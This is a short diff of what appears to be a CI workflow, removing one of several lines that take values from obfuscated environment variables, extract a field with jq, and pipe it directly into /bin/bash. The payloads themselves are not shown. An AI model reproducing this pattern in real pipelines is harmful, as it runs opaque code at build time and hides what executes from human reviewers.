@@ -29,7 +29,6 @@ jobs:
           echo $u5 | jq -r .dqgjz84 | /bin/bash
           echo $rzf32879 | jq -r .djz4 | /bin/bash
           echo $dohov2 | jq -r .nwcjq125 | /bin/bash
-          echo $t955 | jq -r .w5 | /bin/bash
           printf '%s' "$g69" | jq -r .vd8 | /bin/bash
 
       - name: Upload archive
